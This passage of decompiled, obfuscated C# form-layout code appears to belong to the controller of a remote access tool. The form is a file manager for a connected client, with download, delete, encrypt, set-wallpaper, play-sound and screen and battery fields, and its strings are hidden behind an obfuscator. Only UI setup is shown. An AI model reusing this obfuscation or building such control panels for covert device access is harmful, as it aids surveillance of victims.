            this.Panel1.Controls.Add((Control) this.DGVDATA);
            this.Panel1.Controls.Add((Control) this.Panel6);
            this.Panel1.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1153174844 ^ 216182521;
            continue;
          case 163:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1597495913 ^ -1898040861;
            continue;
          case 164:
            this.dcmbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1887498521 ^ -1058862832;
            continue;
          case 165:
            this.Panel4.Dock = DockStyle.Bottom;
            this.Panel4.Location = new Point(0, 809);
            num1 = (int) num2 * -1065883780 ^ -1206875697;
            continue;
          case 166:
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * 496692002 ^ 1327035625;
            continue;
          case 167:
            this.sdbtn.RectHoverColor = Color.White;
            num1 = (int) num2 * 843934646 ^ 1403065427;
            continue;
          case 168:
            this.DownloadToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1760119499 ^ -1302703898;
            continue;
          case 169:
            this.Label2.Size = new Size(0, 41);
            num1 = (int) num2 * 465083965 ^ -4889760;
            continue;
          case 170:
            gridViewCellStyle9.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle9.BackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * 35224049 ^ -1790066898;
            continue;
          case 171:
            this.Downpic.RectHoverColor = Color.White;
            this.Downpic.RectPressColor = Color.White;
            num1 = (int) num2 * -461848039 ^ -1279728040;
            continue;
          case 172:
            this.searchtext.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * 513234563 ^ -1129787998;
            continue;
          case 173:
            this.ThumbsCont.Location = new Point(68, 188);
            num1 = (int) num2 * -1391551606 ^ -205533736;
            continue;
          case 174:
            this.Usrbtry.TabIndex = 17;
            num1 = (int) num2 * -1388703884 ^ 1776509728;
            continue;
          case 175:
            this.DGVDATA.Columns.AddRange((DataGridViewColumn) this.N, (DataGridViewColumn) this.P, (DataGridViewColumn) this.S, (DataGridViewColumn) this.D, (DataGridViewColumn) this.ST);
            this.DGVDATA.ContextMenuStrip = this.ctxMenu;
            num1 = (int) num2 * -1461278470 ^ -1285512992;
            continue;
          case 176:
            gridViewCellStyle9.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle9.ForeColor = Color.White;
            gridViewCellStyle9.SelectionBackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * 755428766 ^ -255497866;
            continue;
          case 177:
            this.searchbtn.Size = new Size(33, 27);
            num1 = (int) num2 * -1822645577 ^ -2066049240;
            continue;
          case 178:
            this.Selecttext.Size = new Size(180, 25);
            num1 = (int) num2 * -1010927975 ^ -546296905;
            continue;
          case 179:
            this.Label1 = new Label();
            num1 = (int) num2 * -1235726495 ^ -98785020;
            continue;
          case 180:
            this.pathtxt.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1870190021 ^ -1714481562;
            continue;
          case 181:
            this.DGV0.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.DGV0.GridColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1519194040 ^ 213003386;
            continue;
          case 182:
            this.DGV0.SelectedIndex = -1;
            num1 = (int) num2 * 2094149169 ^ -1973304912;
            continue;
          case 183:
            this.DeleteToolStripMenuItem.ShortcutKeys = Keys.Delete;
            num1 = (int) num2 * -1180423157 ^ -2024509252;
            continue;
          case 184:
            this.mofdat = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1756707012 ^ -1750934629;
            continue;
          case 185:
            this.DrakeUIButtonIcon5.Size = new Size(33, 26);
            num1 = (int) num2 * -409704614 ^ 1252285028;
            continue;
          case 186:
            this.thumb_chk.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -169945736 ^ -1708573526;
            continue;
          case 187:
            this.DrakeUIButtonIcon8.FillColor = Color.Black;
            this.DrakeUIButtonIcon8.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon8.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon8.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -790077216 ^ 1715997211;
            continue;
          case 188:
            this.thumb_chk.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * 1012159916 ^ -1749174704;
            continue;
          case 189:
            this.Selecttext.Dock = DockStyle.Left;
            this.Selecttext.FlatStyle = FlatStyle.System;
            num1 = (int) num2 * -1198181510 ^ 221045312;
            continue;
          case 190:
            this.AddFilesToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -602837934 ^ -434838547;
            continue;
          case 191:
            this.clinumb.AutoSize = true;
            num1 = (int) num2 * 2102323067 ^ 1603463109;
            continue;
          case 192:
            this.cancelbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 370290364 ^ -1861587137;
            continue;
          case 193:
            this.mofdat.ReadOnly = true;
            this.dat.FillWeight = 50f;
            this.dat.HeaderText = EXGuarder.\u00362625350;
            num1 = (int) num2 * 1491504519 ^ -1486646019;
            continue;
          case 194:
            this.DrakeUIButtonIcon4.RectDisableColor = Color.Transparent;
            this.DrakeUIButtonIcon4.RectHoverColor = Color.Transparent;
            this.DrakeUIButtonIcon4.RectPressColor = Color.Transparent;
            num1 = (int) num2 * -976990037 ^ -1991690085;
            continue;
          case 195:
            this.dat = new DataGridViewTextBoxColumn();
            this.ic = new DataGridViewImageColumn();
            num1 = (int) num2 * -437210831 ^ -416721803;
            continue;
          case 196:
            this.Panel2.Controls.Add((Control) this.Label2);
            num1 = (int) num2 * 1917309620 ^ 87531916;
            continue;
          case 197:
            this.PasteToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1749082794 ^ -793811545;
            continue;
          case 198:
            this.Downpic.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * 2147258254 ^ -228411228;
            continue;
          case 199:
            this.cancelbtn.Symbol = 61534;
            num1 = (int) num2 * -931742487 ^ 251886981;
            continue;
          case 200:
            this.DrakeUIButtonIcon8.RectPressColor = Color.Transparent;
            num1 = (int) num2 * 553925462 ^ 1594089793;
            continue;
          case 201:
            this.dcmbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * -1462188114 ^ 49673532;
            continue;
          case 202:
            gridViewCellStyle2.SelectionForeColor = Color.White;
            num1 = (int) num2 * -313592312 ^ -1238445238;
            continue;
          case 203:
            this.DrakeUIButtonIcon5.RectDisableColor = Color.Transparent;
            num1 = (int) num2 * 357872754 ^ 218189064;
            continue;
          case 204:
            this.DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * 441971286 ^ 1250985543;
            continue;
          case 205:
            gridViewCellStyle9.WrapMode = DataGridViewTriState.True;
            this.DGVDATA.ColumnHeadersDefaultCellStyle = gridViewCellStyle9;
            num1 = (int) num2 * 1788355635 ^ -2006991888;
            continue;
          case 206:
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -637396179 ^ -828692218;
            continue;
          case 207:
            this.searchtext.Name = EXGuarder.\u00311382E23;
            num1 = (int) num2 * -968983282 ^ -211607625;
            continue;
          case 208:
            this.DrakeUIButtonIcon8.RectDisableColor = Color.Transparent;
            this.DrakeUIButtonIcon8.RectHoverColor = Color.Transparent;
            num1 = (int) num2 * 993148992 ^ 1333412690;
            continue;
          case 209:
            this.DrakeUIButtonIcon8.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * 1395127384 ^ 1442895484;
            continue;
          case 210:
            this.Panel6 = new Panel();
            num1 = (int) num2 * -2038148660 ^ 1330574491;
            continue;
          case 211:
            this.Panel1.Location = new Point(179, 51);
            num1 = (int) num2 * 497687511 ^ 1766452767;
            continue;
          case 212:
            this.Panel2.BorderStyle = BorderStyle.FixedSingle;
            this.Panel2.Controls.Add((Control) this.pathtxt);
            num1 = (int) num2 * -1800041126 ^ -1398642009;
            continue;
          case 213:
            this.DrakeUIButtonIcon8.Symbol = 57439;
            num1 = (int) num2 * 485319513 ^ -1504820851;
            continue;
          case 214:
            this.pathtxt.Font = new Font(EXGuarder.\u0036F401941, 9f);
            num1 = (int) num2 * 1325588538 ^ -543047900;
            continue;
          case 215:
            this.DrakeUIButtonIcon4.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * 717082756 ^ -576720283;
            continue;
          case 216:
            this.DGV0.DefaultCellStyle = gridViewCellStyle6;
            this.DGV0.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1003775357 ^ 175516078;
            continue;
          case 217:
            gridViewCellStyle3.SelectionForeColor = Color.White;
            num1 = (int) num2 * 1842787236 ^ 806528079;
            continue;
          case 218:
            this.DrakeUIButtonIcon4.Size = new Size(33, 26);
            num1 = (int) num2 * -689800108 ^ 1356516351;
            continue;
          case 219:
            this.searchbtn.Margin = new Padding(4);
            this.searchbtn.Name = EXGuarder.\u0033D0F5012;
            num1 = (int) num2 * 672111298 ^ 1797958699;
            continue;
          case 220:
            this.ClearButton.Name = EXGuarder.\u0031A5A723E;
            this.ClearButton.Radius = 25;
            this.ClearButton.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.ClearButton.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1301428318 ^ 1891842710;
            continue;
          case 221:
            this.EncryptToolStripMenuItem.Text = EXGuarder.\u0035C595B68;
            this.DecodeToolStripMenuItem.Name = EXGuarder.\u003723B4C4F;
            num1 = (int) num2 * 258505574 ^ 380019150;
            continue;
          case 222:
            this.Panel2.Name = EXGuarder.\u00346782549;
            num1 = (int) num2 * 1677048509 ^ -1902428477;
            continue;
          case 223:
            this.pathtxt.StyleCustomMode = true;
            this.pathtxt.TabIndex = 29;
            num1 = (int) num2 * -1699017223 ^ -401229903;
            continue;
          case 224:
            this.ClearButton.Style = UIStyle.Custom;
            this.ClearButton.TabIndex = 34;
            this.ClearButton.Text = EXGuarder.\u00305312316;
            this.ClearButton.Visible = false;
            this.cancelbtn.Cursor = Cursors.Hand;
            this.cancelbtn.FillColor = Color.Black;
            num1 = (int) num2 * 506015187 ^ 457657740;
            continue;
          case 225:
            this.DeleteToolStripMenuItem.Size = new Size(169, 24);
            this.DeleteToolStripMenuItem.Text = EXGuarder.\u003434E1928;
            this.AddFilesToolStripMenuItem.Name = EXGuarder.\u0031618285E;
            this.AddFilesToolStripMenuItem.Size = new Size(169, 24);
            this.AddFilesToolStripMenuItem.Text = EXGuarder.\u003070F105E;
            this.RenameToolStripMenuItem.Name = EXGuarder.\u00378210D0B;
            this.RenameToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * 1176939265 ^ 1419107543;
            continue;
          case 226:
            ((ISupportInitialize) this.viwimage).EndInit();
            ((ISupportInitialize) this.usrscreen).EndInit();
            ((ISupportInitialize) this.Usrbtry).EndInit();
            ((ISupportInitialize) this.ClientPic).EndInit();
            this.Panel4.ResumeLayout(false);
            num1 = (int) num2 * 784542031 ^ 582845995;
            continue;
          case 227:
            this.ThumbsCont.Text = EXGuarder.\u0035B69212D;
            this.Panel1.BackColor = Color.FromArgb(237, 237, 235);
            num1 = (int) num2 * 177961648 ^ 532224026;
            continue;
          case 228:
            this.DrakeUIButtonIcon7.RectHoverColor = Color.Transparent;
            this.DrakeUIButtonIcon7.RectPressColor = Color.Transparent;
            this.DrakeUIButtonIcon7.RectSelectedColor = Color.Transparent;
            num1 = (int) num2 * 623656782 ^ -686606224;
            continue;
          case 229:
            this.Label2.AutoSize = true;
            this.Label2.Font = new Font(EXGuarder.\u0036F401941, 20f, FontStyle.Bold);
            num1 = (int) num2 * 1503859706 ^ -1226158794;
            continue;
          case 230:
            this.DrakeUIButtonIcon6.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon6.Symbol = 61539;
            this.DrakeUIButtonIcon6.SymbolSize = 29;
            num1 = (int) num2 * -1190663150 ^ 2084008798;
            continue;
          case 231:
            this.thumb_chk.Name = EXGuarder.\u00373241A14;
            this.thumb_chk.Padding = new Padding(22, 0, 0, 0);
            this.thumb_chk.Size = new Size(53, 29);
            num1 = (int) num2 * 975299923 ^ 874914148;
            continue;
          case 232:
            this.PB.Location = new Point(89, 9);
            this.PB.Margin = new Padding(3, 4, 3, 4);
            this.PB.Name = EXGuarder.\u0031E212D02;
            this.PB.Size = new Size(438, 26);
            num1 = (int) num2 * -412438200 ^ -84119685;
            continue;
          case 233:
            this.ClientPic.Margin = new Padding(3, 4, 3, 4);
            this.ClientPic.Name = EXGuarder.\u003523A2068;
            this.ClientPic.Size = new Size(35, 34);
            num1 = (int) num2 * 243595003 ^ -1099708479;
            continue;
          case 234:
            this.CountText.Location = new Point(0, 0);
            num1 = (int) num2 * 1492005206 ^ -2085920321;
            continue;
          case 235:
            this.Panel2.ResumeLayout(false);
            this.Panel2.PerformLayout();
            num1 = (int) num2 * 1592842787 ^ -2025371498;
            continue;
          case 236:
            this.RenameToolStripMenuItem.Text = EXGuarder.\u00343016426;
            this.EditToolStripMenuItem.Name = EXGuarder.\u00379172257;
            num1 = (int) num2 * -2134847299 ^ -879068898;
            continue;
          case 237:
            this.Panel2.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * 1558675714 ^ -1271019614;
            continue;
          case 238:
            this.CountText.Dock = DockStyle.Left;
            this.CountText.FlatStyle = FlatStyle.Flat;
            this.CountText.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.CountText.ForeColor = Color.Lime;
            num1 = (int) num2 * 1470134984 ^ 2112383228;
            continue;
          case 239:
            this.picbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -1638036888 ^ 922044026;
            continue;
          case 240:
            ((ISupportInitialize) this.viwimage).BeginInit();
            ((ISupportInitialize) this.usrscreen).BeginInit();
            ((ISupportInitialize) this.Usrbtry).BeginInit();
            num1 = (int) num2 * -1999584438 ^ -1146701419;
            continue;
          case 241:
            this.Panel2.Size = new Size(837, 51);
            num1 = (int) num2 * -1148693398 ^ 1351410573;
            continue;
          case 242:
            ((ISupportInitialize) this.DGVDATA).BeginInit();
            this.Panel6.SuspendLayout();
            num1 = (int) num2 * 667899442 ^ -1715802307;
            continue;
          case 243:
            this.searchbtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num2 * -1690515788 ^ -1273134140;
            continue;
          case 244:
            this.DrakeWidth_W2.Size = new Size(100, 1);
            num1 = (int) num2 * 518739498 ^ 800717534;
            continue;
          case 245:
            gridViewCellStyle9 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1094614329 ^ 982197339;
            continue;
          case 246:
            this.DrakeUIButtonIcon7.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1853885631 ^ 910198439;
            continue;
          case 247:
            this.DrakeUIButtonIcon4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.Location = new Point(9, 10);
            this.DrakeUIButtonIcon4.Name = EXGuarder.\u003504B001C;
            this.DrakeUIButtonIcon4.Radius = 0;
            this.DrakeUIButtonIcon4.RectColor = Color.Transparent;
            num1 = (int) num2 * -1601188843 ^ 1464792221;
            continue;
          case 248:
            gridViewCellStyle2.ForeColor = Color.White;
            num1 = (int) num2 * 303116100 ^ -1599021472;
            continue;
          case 249:
            this.Panel1.SuspendLayout();
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * -1261823809 ^ 101104687;
            continue;
          case 250:
            this.EditToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1157245860 ^ -999042259;
            continue;
          case 251:
            this.dcmbtn.Text = EXGuarder.\u00352462179;
            num1 = (int) num2 * 911590408 ^ 234932278;
            continue;
          case 252:
            gridViewCellStyle3 = new DataGridViewCellStyle();
            this.ctxMenu = new ContextMenuStrip(this.components);
            this.OpenToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 151707283 ^ -1327601748;
            continue;
          case 253:
            this.pathtxt.Location = new Point(89, 9);
            this.pathtxt.Margin = new Padding(5, 6, 5, 6);
            this.pathtxt.Maximum = (double) int.MaxValue;
            this.pathtxt.Minimum = (double) int.MinValue;
            this.pathtxt.Name = EXGuarder.\u0036E0A6163;
            this.pathtxt.Padding = new Padding(7, 6, 7, 6);
            this.pathtxt.ReadOnly = true;
            num1 = (int) num2 * 1217200642 ^ 701017229;
            continue;
          case 254:
            this.Panel6.Controls.Add((Control) this.Selecttext);
            num1 = (int) num2 * 487776750 ^ 2064855825;
            continue;
          case (uint) byte.MaxValue:
            this.ClearButton.FillColor = Color.Black;
            num1 = (int) num2 * -502577428 ^ -1362679327;
            continue;
          case 256:
            this.P = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -774764389 ^ -725133902;
            continue;
          case 257:
            this.DGVDATA.Size = new Size(837, 774);
            num1 = (int) num2 * 491726832 ^ -1585567941;
            continue;
          case 258:
            this.DrakeUIButtonIcon6.TabIndex = 28;
            num1 = (int) num2 * 1495082857 ^ -2044745299;
            continue;
          case 259:
            this.Downloadnum.Name = EXGuarder.\u0031C45390D;
            num1 = (int) num2 * 118129403 ^ -1099635393;
            continue;
          case 260:
            this.picbtn.FillPressColor = Color.Black;
            this.picbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.picbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -1845611072 ^ -1626521445;
            continue;
          case 261:
            this.Label1.Dock = DockStyle.Right;
            num1 = (int) num2 * -383865851 ^ -1817411089;
            continue;
          case 262:
            this.Panel6.Controls.Add((Control) this.Label1);
            this.Panel6.Controls.Add((Control) this.seentext);
            num1 = (int) num2 * 1391293582 ^ 1952907162;
            continue;
          case 263:
            this.sdbtn.FillColor = Color.Black;
            this.sdbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -1592582340 ^ -1412869691;
            continue;
          case 264:
            this.ThumbsCont.Size = new Size(83, 18);
            num1 = (int) num2 * 1666760554 ^ -51777273;
            continue;
          case 265:
            this.Panel3.Controls.Add((Control) this.DrakeWidth_W3);
            num1 = (int) num2 * 45385211 ^ -1263511258;
            continue;
          case 266:
            gridViewCellStyle1.BackColor = Color.Black;
            this.DGV0.AlternatingRowsDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * 1706589862 ^ -1147257849;
            continue;
          case 267:
            this.seentext.ForeColor = Color.Lime;
            num1 = (int) num2 * -1050184121 ^ 2062852875;
            continue;
          case 268:
            this.Panel6.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            num1 = (int) num2 * -1163372642 ^ -1282448312;
            continue;
          case 269:
            this.searchtext.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num2 * 1022534715 ^ 289532904;
            continue;
          case 270:
            gridViewCellStyle7.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * -604117577 ^ -238103756;
            continue;
          case 271:
            this.ClientPic = new PictureBox();
            this.picbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -256513501 ^ -1062650409;
            continue;
          case 272:
            this.DrakeWidth_W3.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -700182298 ^ 722133006;
            continue;
          case 273:
            this.ShowToolStripMenuItem = new ToolStripMenuItem();
            this.SetWallpaperToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 292909495 ^ -52543447;
            continue;
          case 274:
            this.OpenToolStripMenuItem.Name = EXGuarder.\u00322672F1C;
            num1 = (int) num2 * 2045021960 ^ -1474886440;
            continue;
          case 275:
            this.Downpic.Location = new Point(9, 263);
            num1 = (int) num2 * 652205485 ^ -13265049;
            continue;
          case 276:
            this.typ.FillWeight = 50f;
            num1 = (int) num2 * -2233170 ^ 582829859;
            continue;
          case 277:
            this.DrakeWidth_W2.Name = EXGuarder.\u00349466F20;
            num1 = (int) num2 * -1476009843 ^ 1730965225;
            continue;
          case 278:
            this.DGVDATA.DefaultCellStyle = gridViewCellStyle7;
            this.DGVDATA.Dock = DockStyle.Fill;
            this.DGVDATA.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * 738277269 ^ 698099930;
            continue;
          case 279:
            this.Usrbtry.Name = EXGuarder.\u0032F06721D;
            this.Usrbtry.Size = new Size(33, 33);
            this.Usrbtry.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -1735773870 ^ 1496014198;
            continue;
          case 280:
            this.searchtext.FillColor = Color.Black;
            this.searchtext.Font = new Font(EXGuarder.\u0036F401941, 9f);
            this.searchtext.ForeColor = Color.White;
            num1 = (int) num2 * 345012195 ^ 1003680121;
            continue;
          case 281:
            this.DGVDATA.RowHeadersVisible = false;
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle3.BackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * -1775795258 ^ -656299188;
            continue;
          case 282:
            this.cancelbtn.TabIndex = 33;
            this.cancelbtn.Text = EXGuarder.\u00323730F3A;
            this.cancelbtn.Visible = false;
            this.DrakeWidth_W4.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1982167271 ^ 1412973038;
            continue;
          case 283:
            this.DGVDATA.TabIndex = 7;
            num1 = (int) num2 * 1314345313 ^ 1248566962;
            continue;
          case 284:
            this.ClearButton.RectPressColor = Color.White;
            num1 = (int) num2 * 1994810585 ^ -728622831;
            continue;
          case 285:
            this.ClearButton.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.ClearButton.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.ClearButton.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.ClearButton.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1377100304 ^ 1070669200;
            continue;
          case 286:
            this.EditToolStripMenuItem = new ToolStripMenuItem();
            this.HideToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1415845545 ^ -662615733;
            continue;
          case 287:
            this.dcmbtn.Name = EXGuarder.\u00357794A1A;
            this.dcmbtn.Radius = 25;
            this.dcmbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.dcmbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -739149623 ^ -328376313;
            continue;
          case 288:
            this.DrakeUIButtonIcon8.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon8.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1860060999 ^ 822572218;
            continue;
          case 289:
            this.dcmbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -556035271 ^ -1916158494;
            continue;
          case 290:
            this.DrakeUIButtonIcon7.Size = new Size(63, 41);
            num1 = (int) num2 * 724141397 ^ -360945360;
            continue;
          case 291:
            this.DrakeUIButtonIcon5.Radius = 0;
            num1 = (int) num2 * -458008064 ^ 910996159;
            continue;
          case 292:
            this.PlaySoundToolStripMenuItem = new ToolStripMenuItem();
            this.FolderDownloadsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 949131611 ^ -990006596;
            continue;
          case 293:
            gridViewCellStyle5.SelectionBackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * -2094693503 ^ -1681967181;
            continue;
          case 294:
            this.DrakeUIButtonIcon4.CircleRectWidth = 2;
            num1 = (int) num2 * -632434274 ^ 852374170;
            continue;
          case 295:
            this.ctxMenu.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            num1 = (int) num2 * 799799573 ^ 1805901651;
            continue;
          case 296:
            this.dcmbtn.Size = new Size(163, 26);
            num1 = (int) num2 * 175439839 ^ -949812891;
            continue;
          case 297:
            this.searchbtn.Symbol = 85;
            this.searchbtn.SymbolSize = 30;
            num1 = (int) num2 * 66680560 ^ 2040311373;
            continue;
          case 298:
            this.ClearButton.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1294205398 ^ 1699510303;
            continue;
          case 299:
            this.DrakeUIButtonIcon7.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon7.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon7.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -951760448 ^ 344104130;
            continue;
          case 300:
            this.Margin = new Padding(3, 4, 3, 4);
            this.MinimumSize = new Size(701, 897);
            num1 = (int) num2 * 928810914 ^ -239683279;
            continue;
          case 301:
            this.pathtxt.FillColor = Color.White;
            this.pathtxt.FillDisableColor = Color.Black;
            num1 = (int) num2 * -100061031 ^ 442188781;
            continue;
          case 302:
            this.CountText.TabIndex = 0;
            this.CountText.Text = EXGuarder.\u003650A210F;
            this.Panel3.BackColor = Color.Black;
            this.Panel3.Controls.Add((Control) this.Downloadnum);
            this.Panel3.Controls.Add((Control) this.Downpic);
            this.Panel3.Controls.Add((Control) this.thumb_chk);
            this.Panel3.Controls.Add((Control) this.ClearButton);
            this.Panel3.Controls.Add((Control) this.cancelbtn);
            num1 = (int) num2 * 408228912 ^ -1116098286;
            continue;
          case 303:
            this.DrakeUIButtonIcon7.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 370570104 ^ 1215153664;
            continue;
          case 304:
            gridViewCellStyle7.SelectionForeColor = Color.White;
            num1 = (int) num2 * -473813901 ^ 1312462046;
            continue;
          case 305:
            this.typ = new DataGridViewTextBoxColumn();
            this.nam = new DataGridViewTextBoxColumn();
            this.siz = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -473201521 ^ 1819537175;
            continue;
          case 306:
            this.ShowIcon = false;
            num1 = (int) num2 * -532159619 ^ -212091287;
            continue;
          case 307:
            this.DrakeUIButtonIcon5.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon5.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 2122628272 ^ -785395113;
            continue;
          case 308:
            this.DoubleBuffered = true;
            this.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.ForeColor = Color.White;
            num1 = (int) num2 * 1512618159 ^ -153613526;
            continue;
          case 309:
            this.DGVDATA.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * -308929046 ^ -1167791233;
            continue;
          case 310:
            this.DrakeWidth_W2.TabIndex = 30;
            num1 = (int) num2 * -1125991176 ^ -154132634;
            continue;
          case 311:
            this.Downpic.Cursor = Cursors.Hand;
            this.Downpic.FillColor = Color.Black;
            this.Downpic.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -162585204 ^ 2116738000;
            continue;
          case 312:
            this.seentext.Location = new Point(321, 0);
            num1 = (int) num2 * 1845643190 ^ -761559308;
            continue;
          case 313:
            this.PasteToolStripMenuItem.Name = EXGuarder.\u003555B2617;
            num1 = (int) num2 * 368573187 ^ -1407430812;
            continue;
          case 314:
            this.SetWallpaperToolStripMenuItem.Name = EXGuarder.\u00307141A65;
            this.SetWallpaperToolStripMenuItem.Size = new Size(169, 24);
            this.SetWallpaperToolStripMenuItem.Text = EXGuarder.\u0031902626A;
            this.PlaySoundToolStripMenuItem.Name = EXGuarder.\u0033B3D331D;
            this.PlaySoundToolStripMenuItem.Size = new Size(169, 24);
            this.PlaySoundToolStripMenuItem.Text = EXGuarder.\u0035E474030;
            num1 = (int) num2 * 1962948284 ^ 1751832743;
            continue;
          case 315:
            this.ThumbsCont.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 67381270 ^ 320475181;
            continue;
          case 316:
            this.Downpic = new DrakeUIButtonIcon();
            this.thumb_chk = new DrakeUICheckBox();
            num1 = (int) num2 * -2116649876 ^ 1889115785;
            continue;
          case 317:
            this.searchtext.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * 1621331295 ^ -897609025;
            continue;
          case 318:
            this.DGV0.BackgroundColor = Color.FromArgb(20, 20, 20);
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            gridViewCellStyle8.Alignment = DataGridViewContentAlignment.MiddleCenter;
            gridViewCellStyle8.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 243619916 ^ -2097585223;
            continue;
          case 319:
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 883025082 ^ -1076723512;
            continue;
          case 320:
            gridViewCellStyle7.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1515785182 ^ 1036539482;
            continue;
          case 321:
            this.Name = EXGuarder.\u00341580413;
            this.Opacity = 0.0;
            num1 = (int) num2 * 186877708 ^ -1076720842;
            continue;
          case 322:
            this.cancelbtn.Name = EXGuarder.\u003723D5E2B;
            this.cancelbtn.Radius = 25;
            num1 = (int) num2 * 1563600515 ^ -1618962770;
            continue;
          case 323:
